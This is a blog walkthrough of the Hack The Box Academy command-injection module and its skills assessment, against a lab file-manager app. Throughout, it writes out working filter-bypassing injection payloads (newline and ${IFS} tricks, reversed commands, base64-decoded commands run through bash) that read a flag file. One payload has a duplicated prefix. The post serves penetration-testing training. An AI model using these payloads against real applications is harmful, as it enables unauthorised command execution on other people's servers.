---
layout: post
title:  "Hack The Box - Academy - Command Injections"
description: "Follow this comprehensive walkthrough of the Hack The Box Academy Command Injection Skills Assessment. Master command injection techniques to exploit vulnerable web applications, perfect for boosting your penetration testing skills and preparing for HTB challenges."
date:   2024-10-19 13:32
image:  /images/htb/command-injection/logo.png
tags:   [command-injection,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's Command Injections module. Learn effective techniques to exploit command injection vulnerabilities.

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/109/section/1031">Command Injection</a><br/>
<a href="https://jacozwarts.github.io/images/htb/command-injection/Command_Injections_Module_Cheat_Sheet.pdf">Command Injection - Cheat Sheet</a><br/>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space">PayloadsAllTheThings - Command Injection - Bypass without Space</a>

<hr/>

### Bypassing Other Blacklisted Characters - Exercises
#### Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?
A gotcha I ran into was I didn't add a `space` between the `;` and command I'm was trying to execute e.g.
`Incorrect payload: 127.0.0.1${LS_COLORS:10:1}$(rev<<<'imaohw')` <br/><br/>
`Correct payload with a encoded \n (%0a)`
```
127.0.0.1${LS_COLORS:10:1}%0a$(rev<<<'imaohw')
```
![Bypassing other blacklisted characters exercise gotcha](/images/htb/command-injection/bypassing-other-blacklisted-characters-gotcha.png)

#### Final payload:
Initially, I tried the following command but didn't retrieve the user in `/home`: `127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}%0a${PATH:0:1}home`. The issue stemmed from using the encoded newline character (`%0a`) immediately after `{ls,-la}`, which caused the command to execute incorrectly.

`Correct payload:`
```
127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
```
<hr/>

### Bypassing Blacklisted Commands
#### Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
```
127.0.0.1${LS_COLORS:10:1}%0a$(rev<<<'tac')${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
<hr/>

### Advanced Command Obfuscation

#### Exercise: Can you test the below command to see if it works on your Linux VM, and then try to avoid using filtered characters to get it working on the web application?
`$(a="WhOaMi";printf %s "${a,,}")`<br/><br/>
First, we tested individual characters to identify which ones were filtered, such as the semicolon (`;`), space, pipe (`|`), ampersand (`&`), etc. In our case, all of these characters were blocked except for the newline character (`%0a`). To proceed, we needed to modify our payload to avoid using these filtered characters. Another solution is to `Base64 encode` the payload to bypass the filtering<br/><br/>

**Updated command without Base64 encoding:**
```
127.0.0.1%0a$(a="WhOaMi"%0aprintf${IFS}%s${IFS}"${a,,}")
```
**Updated command with Base64 encoding:**
```
127.0.0.1%0abash<<<$(base64%09-d<<<JChhPSJXaE9hTWkiO3ByaW50ZiAlcyAiJHthLCx9Iik=)
```

#### Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
**Execute the below command to base64 encode the payload:**
```
echo -n "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
```

```
127.0.0.1127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```
<hr/>

## Skills Assessment
><b>Overview:</b>
You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.
<br/><br/>
Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.

### What is the content of '/flag.txt'?
Start by opening the target in your browser and ensure Burp Suite is intercepting all requests. Log in with the provided credentials: `guest:guest`.
![Login](/images/htb/command-injection/command-injection-skills-assessment-login.png)

Upon examining the target’s features, I identified the following functionalities:
- File Manager
![File Manager](/images/htb/command-injection/command-injection-skills-assessment-file-manager.png)
- Search Functionality
![Search Functionality](/images/htb/command-injection/command-injection-skills-assessment-search.png)
- Advanced Search
![Advanced Search Functionality](/images/htb/command-injection/command-injection-skills-assessment-advanced-search.png)
- View File
![View File](/images/htb/command-injection/command-injection-skills-assessment-view-file.png)
- Move File
![Move File](/images/htb/command-injection/command-injection-skills-assessment-move-file.png)
- Direct Link
![Search Functionality](/images/htb/command-injection/command-injection-skills-assessment-direct-link.png)
- Download File
![Search Functionality](/images/htb/command-injection/command-injection-skills-assessment-download-file.png)

I then intercepted and analyzed these features’ requests through Burp Suite, where I observed that each request has varying parameters, such as:

```
GET /index.php?to=&view=51459716.txt&quickView=1
```
```
GET /index.php?to=&from=51459716.txt
```
```
GET /index.php?to=&dl=51459716.txt
```
```
POST /index.php?to=

...

ajax=true&content=514&path=.&type=search
```
```
GET /index.php?to=&from=605311066.txt
```
```
GET /index.php?to=&from=605311066.txt&finish=1&move=1
```
### Testing for Command Injection
I tested the parameters mentioned above for potential command injection vulnerabilities and found that the `to` and `from` parameters in the 'Move File' request are vulnerable. The next step is to identify which injection operators are allowed. You can refer to the command injection <a href="https://jacozwarts.github.io/images/htb/command-injection/Command_Injections_Module_Cheat_Sheet.pdf">Cheat Sheet</a> to test various operators.

![Testing To Parameter](/images/htb/command-injection/command-injection-skills-assessment-move-file-to-parameter.png)

![Testing From Parameter](/images/htb/command-injection/command-injection-skills-assessment-move-file-from-paramter.png)

![Testing Operator](/images/htb/command-injection/comman-injection-skills-assessment-injection-operators.png)

I discovered that the operator `%26%26` is accepted. Based on the error message, it’s clear the server is using the mv command.
![Valid Operator](/images/htb/command-injection/command-injection-skills-assessment-valid-injection-operator.png)
### Command Injection Payload
```
%26%26whoami
```
![Whoami Command is blocked](/images/htb/command-injection/command-injection-skills-assessment-whoami-blocked.png)

Since whoami is blocked, I’ll encode it using base64. Here’s how to encode the whoami command:

```
echo -n "whoami" | base64
```
**Then replace the space character with a tab (%09):**
```
bash<<<$(base64%09-d<<<"d2hvYW1p")
```
When running this, I encountered the error: missing destination. So, I’ll apply the payload in the `to` parameter as follows:
![Missing Destination](/images/htb/command-injection/command-injection-skills-assessment-missing-destination-error.png)

```
/index.php?to=tmp%26%26bash<<<$(base64%09-d<<<"d2hvYW1p")&from=696212415.txt&finish=1&move=1
```
### Gotcha:
Once you move a file, it cannot be moved again. To get around this, you’ll need to change the filename in the `from` parameter.

![Whoami Result](/images/htb/command-injection/command-injection-skills-assessment-whoami-result.png)

Now that we’ve successfully executed the `whoami` command, the next goal is to read the directory contents using `ls -la`. First, base64 encode the command:

```
echo -n "ls -la" | base64
```

```
bash<<<$(base64%09-d<<<"bHMgLWxh")
```
Update the `from` filename from `696212415.txt` to `787113764.txt` and rerun the payload.

![Read files in directory](/images/htb/command-injection/command-injection-skills-assessment-read-files-result.png)

### Reading the flag.txt File
Finally, let’s try to read the `flag.txt` file. Base64 encode the following:
```
echo -n "cat ${PATH:0:1}flag.txt" | base64
```
```
bash<<<$(base64%09-d<<<"Y2F0IC9mbGFnLnR4dA==")
```
**Change the `from` file name and test the payload.**
![Reading flag.txt content](/images/htb/command-injection/command-injection-skills-assessment-flag-result.png)
<hr/>